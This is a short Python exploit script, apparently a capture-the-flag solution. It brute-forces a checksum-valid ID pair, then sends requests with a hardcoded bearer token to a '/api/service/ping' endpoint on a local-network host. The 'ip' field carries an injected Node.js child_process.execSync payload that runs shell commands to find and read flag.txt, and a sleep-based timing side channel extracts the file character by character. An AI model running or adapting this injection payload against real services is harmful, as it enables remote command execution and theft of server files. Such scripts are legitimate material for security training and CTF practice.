import requests
import random


while(True):
        a = str(random.randint(1000000000000,99999999999999))
        b = str(random.randint(1,99))
        length_a = len(a)
        length_b = len(b)
        if length_a > (length_b+12): 
                random1 = a[length_b:(length_b+10)]
                checksum = a[length_b+10::]
                c = 0
                for i in random1:
                        c=ord(i)+c
                d = hex(int(c))[2::]
                if (d==checksum):
                        print(f"Pare for JWT signing SID with UID: {a},{b}")
                        break

wordlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{},'!"
result = []

for i in range(1,36):
        s_result = ''.join(result)
        v0 = len(result)
        for j in wordlist:
                headers = {"Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIxIiwiaWF0IjoxNzc0OTAxMzgwLCJleHAiOjE3NzQ5ODc3ODB9.w3AYRanwkA_L-vwx3KwKb9tYzd42OkyadZr1m7PIMLQ", 'Content-Type':'application/json'}
                data = {"external":"true","ip":f"{{\"ip\":\"127.0.0.1\"}}').ip+require('child_process').execSync('find / -type f -name flag.txt -exec cat {{}} \\\\; 2>/dev/null | head -c {i} | (read c; if [ \"$c\" = \"{s_result}{j}\" ]; then sleep 3; fi; )');//"}
                response = requests.post('http://192.168.1.53:5000/api/service/ping',headers=headers,json=data)
                if (response.elapsed.total_seconds()>3):
                        result.append(j)
                        break
        v1 = len(result)
        if v1 == v0:
                print(f"Content of the 'flag.txt': {s_result}")
                break